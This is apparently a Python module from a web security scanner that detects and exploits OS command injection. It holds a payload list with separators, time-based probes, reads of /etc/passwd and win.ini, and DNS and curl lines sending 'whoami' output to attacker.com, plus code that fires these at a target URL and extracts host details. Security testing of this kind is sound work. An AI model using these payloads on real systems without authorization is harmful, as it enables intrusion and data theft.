"""
Command Injection Context Implementation

Implements command injection detection and exploitation using the 6-step methodology.
"""

import re
import time
from typing import List, Dict, Any, Tuple, Optional
from .base import InjectionAttackModule, InjectionContextType


class CommandInjectionModule(InjectionAttackModule):
    """
    Command injection attack module.
    Detects and exploits OS command injection vulnerabilities.
    """
    
    def get_context_type(self) -> InjectionContextType:
        return InjectionContextType.COMMAND
    
    def _load_payloads(self) -> List[str]:
        """Load command injection payloads for various operating systems."""
        return [
            # Unix/Linux command separators
            "; whoami",
            "| whoami",
            "|| whoami",
            "& whoami",
            "&& whoami",
            "` whoami `",
            "$( whoami )",
            
            # Unix time-based detection
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "` sleep 5 `",
            "$( sleep 5 )",
            
            # Windows command separators
            "& whoami",
            "&& whoami",
            "| whoami",
            "|| whoami",
            
            # Windows time-based detection
            "& timeout 5",
            "&& timeout 5",
            "| timeout 5",
            
            # Command substitution
            "; id",
            "| id",
            "&& id",
            
            # Path traversal with command execution
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            
            # Windows specific
            "& type C:\\Windows\\win.ini",
            "&& type C:\\Windows\\win.ini",
            
            # Multi-platform directory listing
            "; ls",
            "| ls",
            "&& ls",
            "& dir",
            "&& dir",
            
            # Encoded payloads (URL encoded semicolon)
            "%3B whoami",
            "%7C whoami",
            "%26 whoami",
            
            # Newline injection
            "\n whoami",
            "\r\n whoami",
            
            # Inline execution
            "`whoami`",
            "$(whoami)",
            
            # DNS exfiltration patterns
            "; nslookup $(whoami).attacker.com",
            "| nslookup $(whoami).attacker.com",
            
            # Curl/wget based detection
            "; curl http://attacker.com/$(whoami)",
            "| wget http://attacker.com/$(whoami)",
        ]
    
    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        """Load command injection error and output patterns."""
        return [
            # Unix/Linux user information
            {'pattern': r'uid=\d+', 'type': 'command_output', 'confidence': 0.98},
            {'pattern': r'gid=\d+', 'type': 'command_output', 'confidence': 0.98},
            {'pattern': r'groups=', 'type': 'command_output', 'confidence': 0.95},
            
            # Common Unix usernames in whoami output
            {'pattern': r'(root|www-data|apache|nginx|nobody|daemon)', 'type': 'command_output', 'confidence': 0.90},
            
            # /etc/passwd content
            {'pattern': r'root:x:0:0:', 'type': 'command_output', 'confidence': 0.99},
            {'pattern': r':[^:]*:\d+:\d+:[^:]*:[^:]*:[^:]*', 'type': 'command_output', 'confidence': 0.85},
            
            # Windows user information
            {'pattern': r'[A-Z]:\\Users\\', 'type': 'command_output', 'confidence': 0.90},
            {'pattern': r'COMPUTERNAME', 'type': 'command_output', 'confidence': 0.85},
            
            # Windows system files
            {'pattern': r'\[fonts\]', 'type': 'command_output', 'confidence': 0.95},  # win.ini
            {'pattern': r'\[extensions\]', 'type': 'command_output', 'confidence': 0.95},  # win.ini
            
            # Command not found errors
            {'pattern': r'command not found', 'type': 'error', 'confidence': 0.80},
            {'pattern': r'is not recognized as an internal or external command', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'not found.*line', 'type': 'error', 'confidence': 0.80},
            
            # Shell syntax errors
            {'pattern': r'syntax error', 'type': 'error', 'confidence': 0.75},
            {'pattern': r'unexpected.*token', 'type': 'error', 'confidence': 0.75},
            {'pattern': r'parse error', 'type': 'error', 'confidence': 0.75},
            
            # Permission denied (indicates command attempted)
            {'pattern': r'permission denied', 'type': 'error', 'confidence': 0.70},
            {'pattern': r'access.*denied', 'type': 'error', 'confidence': 0.70},
            
            # Shell-specific errors
            {'pattern': r'sh: ', 'type': 'error', 'confidence': 0.80},
            {'pattern': r'bash: ', 'type': 'error', 'confidence': 0.80},
            {'pattern': r'cmd.exe', 'type': 'error', 'confidence': 0.80},
            
            # Directory listing patterns
            {'pattern': r'total \d+', 'type': 'command_output', 'confidence': 0.75},  # ls -l
            {'pattern': r'drwxr', 'type': 'command_output', 'confidence': 0.85},  # Unix permissions
            {'pattern': r'Volume in drive [A-Z]', 'type': 'command_output', 'confidence': 0.90},  # Windows dir
        ]
    
    # ========================================
    # Six-Step Injection Testing Methodology
    # ========================================
    
    def step1_supply_payloads(self, parameter_value: str) -> List[str]:
        """
        Step 1: Supply unexpected syntax and context-specific payloads.
        
        Returns command injection payloads appropriate for various OS types.
        """
        return self.payloads
    
    def step2_detect_anomalies(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_response: Optional[Tuple[str, float]] = None
    ) -> Tuple[bool, List[str]]:
        """
        Step 2: Detect anomalies and error messages in responses.
        
        Look for command output patterns, errors, or timing differences.
        """
        anomalies = []
        
        # Check for command output patterns
        for pattern_info in self.detection_patterns:
            pattern = pattern_info['pattern']
            if re.search(pattern, response_body, re.IGNORECASE | re.MULTILINE):
                anomalies.append(f"{pattern_info['type']}: {pattern}")
        
        # Check for timing-based detection
        if baseline_response:
            baseline_body, baseline_time = baseline_response
            if response_time > baseline_time + 4.5:
                anomalies.append(f"time_based: Response delayed by {response_time - baseline_time:.2f}s")
        
        # Check for significant content changes
        if baseline_response:
            baseline_body, _ = baseline_response
            if len(response_body) != len(baseline_body):
                size_diff = abs(len(response_body) - len(baseline_body))
                if size_diff > 100:  # Significant size change
                    anomalies.append(f"content_change: Response size changed by {size_diff} bytes")
        
        return len(anomalies) > 0, anomalies
    
    def step3_extract_evidence(
        self,
        response_body: str,
        anomalies: List[str]
    ) -> Dict[str, Any]:
        """
        Step 3: Analyze and extract error/evidence from response.
        
        Parse command output and extract system information.
        """
        evidence = {
            'error_type': 'command_injection',
            'details': {},
            'context_info': {},
            'confidence': 0.0
        }
        
        # Extract user information
        uid_match = re.search(r'uid=(\d+)\(([^)]+)\)', response_body)
        if uid_match:
            evidence['details']['user_id'] = uid_match.group(1)
            evidence['details']['username'] = uid_match.group(2)
            evidence['context_info']['os_type'] = 'unix'
            evidence['confidence'] = max(evidence['confidence'], 0.95)
        
        # Extract Windows user path
        win_user = re.search(r'[A-Z]:\\Users\\([^\\]+)', response_body)
        if win_user:
            evidence['details']['username'] = win_user.group(1)
            evidence['context_info']['os_type'] = 'windows'
            evidence['confidence'] = max(evidence['confidence'], 0.90)
        
        # Detect OS from command output
        if 'root:x:0:0:' in response_body or 'uid=' in response_body:
            evidence['context_info']['os_type'] = 'unix'
        elif '[fonts]' in response_body.lower() or 'volume in drive' in response_body.lower():
            evidence['context_info']['os_type'] = 'windows'
        
        # Calculate confidence based on anomalies
        for anomaly in anomalies:
            if 'command_output' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.85)
            elif 'error' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.70)
            elif 'time_based' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.75)
        
        evidence['details']['anomalies'] = anomalies
        
        return evidence
    
    def step4_mutate_and_verify(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Tuple[bool, float, str]:
        """
        Step 4: Mutate input systematically to confirm or disprove vulnerabilities.
        
        Test variations to ensure it's not a false positive.
        """
        import requests
        
        # Generate verification payloads
        verification_payloads = []
        
        if 'sleep' in successful_payload or 'timeout' in successful_payload:
            # For time-based, test with different delays
            verification_payloads = [
                successful_payload.replace('5', '3'),
                successful_payload.replace('5', '7'),
            ]
        else:
            # For output-based, test similar commands
            if 'whoami' in successful_payload:
                verification_payloads = [
                    successful_payload.replace('whoami', 'id'),
                    successful_payload.replace('whoami', 'hostname'),
                ]
            elif 'id' in successful_payload:
                verification_payloads = [
                    successful_payload.replace('id', 'whoami'),
                ]
        
        verification_count = 0
        verification_evidence = []
        
        for verify_payload in verification_payloads[:2]:  # Test up to 2 variations
            try:
                injected_value = self._inject_payload(parameter_value, verify_payload)
                start_time = time.time()
                
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={parameter_name: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 15)
                    )
                elif parameter_type.upper() == "POST":
                    response = requests.post(
                        target_url,
                        data={parameter_name: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 15)
                    )
                else:
                    continue
                
                response_time = time.time() - start_time
                
                # Analyze verification response
                detected, anomalies = self.step2_detect_anomalies(
                    response.text, dict(response.headers), response_time
                )
                
                if detected:
                    verification_count += 1
                    verification_evidence.append(f"Verified with payload: {verify_payload[:50]}")
                
            except Exception as e:
                continue
        
        # Consider confirmed if at least one verification succeeded
        confirmed = verification_count > 0
        confidence = 0.85 if confirmed else 0.60
        evidence = f"Verified {verification_count}/{len(verification_payloads[:2])} variations. " + "; ".join(verification_evidence)
        
        return confirmed, confidence, evidence
    
    def step5_build_poc(
        self,
        vulnerable_parameter: str,
        successful_payload: str,
        evidence: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Step 5: Build proof-of-concept payloads for safe, verifiable exploits.
        
        Create a safe POC that demonstrates the vulnerability.
        """
        os_type = evidence.get('context_info', {}).get('os_type', 'unknown')
        
        # Select safe POC command based on OS
        if os_type == 'unix':
            poc_payload = "; echo 'VULN_CONFIRMED_$(whoami)'"
            expected = "Output containing 'VULN_CONFIRMED_' followed by username"
        elif os_type == 'windows':
            poc_payload = "& echo VULN_CONFIRMED_%USERNAME%"
            expected = "Output containing 'VULN_CONFIRMED_' followed by username"
        else:
            # Generic safe POC
            poc_payload = "; echo VULN_CONFIRMED"
            expected = "Output containing 'VULN_CONFIRMED'"
        
        return {
            'poc_payload': poc_payload,
            'expected_result': expected,
            'safety_notes': 'This POC only echoes text and does not modify system state',
            'reproduction_steps': [
                f"1. Send request with parameter '{vulnerable_parameter}' containing: {poc_payload}",
                f"2. Observe response for: {expected}",
                "3. Vulnerability is confirmed if expected output appears"
            ],
            'original_payload': successful_payload,
            'os_type': os_type
        }
    
    def step6_automated_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        poc_payload: str,
        evidence: Dict[str, Any],
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Optional[Dict[str, Any]]:
        """
        Step 6: Exploitation automation for verified cases.
        
        Safely extract system information without causing damage.
        """
        import requests
        
        os_type = evidence.get('context_info', {}).get('os_type', 'unknown')
        
        # Define safe exploitation payloads
        if os_type == 'unix':
            exploit_payloads = {
                'username': '; whoami',
                'user_id': '; id',
                'hostname': '; hostname',
                'working_directory': '; pwd',
                'os_info': '; uname -a',
            }
        elif os_type == 'windows':
            exploit_payloads = {
                'username': '& whoami',
                'hostname': '& hostname',
                'working_directory': '& cd',
                'os_info': '& ver',
            }
        else:
            # Minimal safe exploitation
            exploit_payloads = {
                'username': '; whoami',
            }
        
        extracted_data = {}
        
        for key, payload in exploit_payloads.items():
            try:
                injected_value = self._inject_payload('', payload)
                
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={vulnerable_parameter: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 10)
                    )
                elif parameter_type.upper() == "POST":
                    response = requests.post(
                        target_url,
                        data={vulnerable_parameter: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 10)
                    )
                else:
                    continue
                
                # Extract relevant information from response
                if response.status_code == 200:
                    # Look for command output in response
                    lines = response.text.split('\n')
                    # Find lines that look like command output
                    for line in lines:
                        line = line.strip()
                        if line and len(line) < 200:  # Reasonable output length
                            # Simple heuristic: if line contains no HTML tags, might be output
                            if '<' not in line and '>' not in line:
                                extracted_data[key] = line
                                break
                
            except Exception as e:
                continue
        
        if extracted_data:
            return {
                'success': True,
                'data_extracted': extracted_data,
                'impact_level': 'high',
                'remediation': [
                    'Implement input validation to reject special shell characters',
                    'Use parameterized APIs instead of shell command execution',
                    'Apply principle of least privilege to application processes',
                    'Consider using allowlists for valid input values',
                    'Sanitize input by escaping shell metacharacters'
                ]
            }
        
        return None
    
    # ========================================
    # Legacy/Compatibility Methods
    # ========================================
    
    def analyze_response(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_time: Optional[float] = None
    ) -> Tuple[bool, float, str]:
        """
        Analyze response for command injection indicators.
        
        This method integrates steps 2 and 3 for backward compatibility.
        """
        # Step 2: Detect anomalies
        baseline_response = None
        if baseline_time:
            baseline_response = ("", baseline_time)
        
        detected, anomalies = self.step2_detect_anomalies(
            response_body, response_headers, response_time, baseline_response
        )
        
        if not detected:
            return False, 0.0, "No command injection detected"
        
        # Step 3: Extract evidence
        evidence_data = self.step3_extract_evidence(response_body, anomalies)
        
        confidence = evidence_data['confidence']
        evidence_str = f"Command injection detected. {evidence_data['error_type']}. "
        evidence_str += f"Details: {evidence_data['details']}. Anomalies: {', '.join(anomalies[:3])}"
        
        return True, confidence, evidence_str
    
    def attempt_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        successful_payload: str
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt to exploit a confirmed command injection vulnerability.
        
        This method integrates steps 4, 5, and 6 for backward compatibility.
        """
        # Step 4: Verify the vulnerability
        confirmed, confidence, verification_evidence = self.step4_mutate_and_verify(
            target_url, vulnerable_parameter, parameter_type,
            '', successful_payload
        )
        
        if not confirmed:
            return None
        
        # Step 3: Get evidence for POC building
        evidence = {
            'context_info': {},
            'details': {}
        }
        
        # Step 5: Build POC
        poc_data = self.step5_build_poc(vulnerable_parameter, successful_payload, evidence)
        
        # Step 6: Automated exploitation
        exploitation_result = self.step6_automated_exploitation(
            target_url, vulnerable_parameter, parameter_type,
            poc_data['poc_payload'], evidence
        )
        
        if exploitation_result:
            exploitation_result['poc'] = poc_data
            exploitation_result['verification'] = verification_evidence
        
        return exploitation_result
    
    def get_description(self) -> str:
        """Get a human-readable description of this module."""
        return "Command Injection - Tests for OS command injection vulnerabilities in system calls"

